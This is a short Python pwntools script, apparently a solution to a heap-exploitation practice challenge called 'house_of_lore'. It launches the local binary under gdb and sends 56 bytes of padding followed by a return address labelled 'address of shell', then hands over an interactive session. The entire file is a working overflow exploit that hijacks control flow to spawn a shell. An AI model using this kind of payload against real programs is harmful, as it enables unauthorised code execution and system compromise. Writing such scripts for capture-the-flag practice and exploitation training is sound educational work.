from pwn import *

p = process(['./house_of_lore'])
gdb.attach(p)

print(p.recvuntil(b'the heap\n').decode('UTF-8'))
p.sendline(b'A' * 56 + p64(0x4011de)) # padding + address of shell

p.interactive()
